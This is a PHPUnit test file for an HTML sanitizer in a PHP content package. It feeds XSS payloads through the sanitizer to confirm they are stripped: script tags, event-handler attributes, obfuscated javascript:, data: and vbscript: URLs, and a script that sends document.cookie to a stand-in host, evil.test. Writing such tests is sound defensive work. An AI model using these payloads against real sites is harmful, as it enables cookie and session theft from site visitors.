<?php

namespace Serfix\ContentAi\Tests;

use PHPUnit\Framework\Attributes\DataProvider;
use Serfix\ContentAi\Models\Article;
use Serfix\ContentAi\Services\HtmlSanitizer;

/**
 * The package injects article HTML into someone else's page. The HMAC is the
 * only thing between an attacker and that markup, so a leaked signing secret
 * must not escalate into stored XSS on every client site.
 */
class HtmlSanitizerTest extends TestCase
{
    private function clean(string $html): string
    {
        return app(HtmlSanitizer::class)->sanitize($html);
    }

    public function test_script_tags_are_removed_with_their_contents(): void
    {
        $out = $this->clean('<p>Before</p><script>alert(document.cookie)</script><p>After</p>');

        $this->assertStringNotContainsString('<script', $out);
        $this->assertStringNotContainsString('alert(', $out);
        $this->assertStringContainsString('Before', $out);
        $this->assertStringContainsString('After', $out);
    }

    public function test_event_handler_attributes_are_stripped(): void
    {
        $out = $this->clean('<p onclick="steal()" onmouseover="x()">Text</p><img src="https://a.test/x.png" onerror="alert(1)">');

        $this->assertStringNotContainsString('onclick', $out);
        $this->assertStringNotContainsString('onmouseover', $out);
        $this->assertStringNotContainsString('onerror', $out);
        $this->assertStringContainsString('Text', $out);
        $this->assertStringContainsString('https://a.test/x.png', $out, 'the image itself survives');
    }

    /** @return list<array{0: string}> */
    public static function dangerousUrls(): array
    {
        return [
            ['javascript:alert(1)'],
            ['JaVaScRiPt:alert(1)'],
            ["java\tscript:alert(1)"],       // control character smuggling
            ['java&#09;script:alert(1)'],    // entity smuggling
            ['  javascript:alert(1)'],       // leading whitespace
            ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            ['vbscript:msgbox(1)'],
        ];
    }

    #[DataProvider('dangerousUrls')]
    public function test_dangerous_url_schemes_are_dropped(string $url): void
    {
        $out = $this->clean('<a href="'.$url.'">Click me</a>');

        $this->assertStringNotContainsString('javascript', strtolower($out));
        $this->assertStringNotContainsString('vbscript', strtolower($out));
        $this->assertStringNotContainsString('data:text/html', strtolower($out));
        $this->assertStringContainsString('Click me', $out, 'the text stays, only the href goes');
    }

    public function test_safe_links_and_relative_urls_survive(): void
    {
        $out = $this->clean(
            '<a href="https://example.com/a">abs</a>'
            .'<a href="/blog/other">rel</a>'
            .'<a href="#section">frag</a>'
            .'<a href="mailto:hi@example.com">mail</a>'
        );

        $this->assertStringContainsString('https://example.com/a', $out);
        $this->assertStringContainsString('/blog/other', $out);
        $this->assertStringContainsString('#section', $out);
        $this->assertStringContainsString('mailto:hi@example.com', $out);
    }

    public function test_iframes_forms_and_style_blocks_are_removed(): void
    {
        $out = $this->clean(
            '<iframe src="https://evil.test"></iframe>'
            .'<form action="/steal"><input name="password"></form>'
            .'<style>body{display:none}</style>'
            .'<p>Kept</p>'
        );

        foreach (['<iframe', '<form', '<input', '<style'] as $tag) {
            $this->assertStringNotContainsString($tag, $out);
        }
        $this->assertStringContainsString('Kept', $out);
    }

    /** style= carries expression()/behavior/url(javascript:) — never allowed. */
    public function test_inline_style_attributes_are_stripped(): void
    {
        $out = $this->clean('<p style="background:url(javascript:alert(1))">Text</p>');

        $this->assertStringNotContainsString('style=', $out);
        $this->assertStringContainsString('Text', $out);
    }

    /** Unknown tags are unwrapped, not deleted — the reader keeps the prose. */
    public function test_unknown_tags_are_unwrapped_but_their_text_is_kept(): void
    {
        $out = $this->clean('<marquee><p>Important paragraph</p></marquee>');

        $this->assertStringNotContainsString('<marquee', $out);
        $this->assertStringContainsString('Important paragraph', $out);
    }

    public function test_the_markup_content_ai_actually_writes_is_preserved(): void
    {
        $html = '<h2 id="how">How it works</h2>'
            .'<p>Some <strong>bold</strong> and <em>italic</em> text with a <a href="/blog/x">link</a>.</p>'
            .'<figure><img src="https://cdn.test/a.png" alt="Alt" width="800" height="450" loading="lazy">'
            .'<figcaption>Caption</figcaption></figure>'
            .'<ul><li>One</li><li>Two</li></ul>'
            .'<table><thead><tr><th scope="col">H</th></tr></thead><tbody><tr><td colspan="2">C</td></tr></tbody></table>'
            .'<section class="faq"><h2>Q?</h2><p>A.</p></section>';

        $out = $this->clean($html);

        foreach (['<h2 id="how"', '<strong>', '<em>', 'href="/blog/x"', '<figure>', '<figcaption>',
            'alt="Alt"', 'width="800"', 'loading="lazy"', '<ul>', '<li>', '<table>', '<th scope="col"',
            '<td colspan="2"', 'class="faq"'] as $needle) {
            $this->assertStringContainsString($needle, $out, "lost: {$needle}");
        }
    }

    public function test_target_blank_links_gain_noopener(): void
    {
        $out = $this->clean('<a href="https://example.com" target="_blank">x</a>');

        $this->assertStringContainsString('noopener', $out);
        $this->assertStringContainsString('noreferrer', $out);
    }

    /** End to end: a signed delivery carrying a payload is stored clean. */
    public function test_a_delivered_article_is_stored_sanitized(): void
    {
        $this->deliver($this->articlePayload([
            'article' => [
                'html' => '<p>Real content.</p><script>fetch("https://evil.test?c="+document.cookie)</script>'
                    .'<img src=x onerror="alert(1)">',
            ],
        ]))->assertOk();

        $stored = Article::query()->first()->html;

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringNotContainsString('evil.test', $stored);
        $this->assertStringContainsString('Real content.', $stored);
    }

    /** Opt-out still works for hosts that need exotic markup. */
    public function test_sanitizing_can_be_disabled(): void
    {
        config(['content-ai.content.sanitize_html' => false]);

        $this->deliver($this->articlePayload([
            'article' => ['html' => '<p>Hi</p><script>x()</script>'],
        ]))->assertOk();

        $this->assertStringContainsString('<script', Article::query()->first()->html);
    }
}
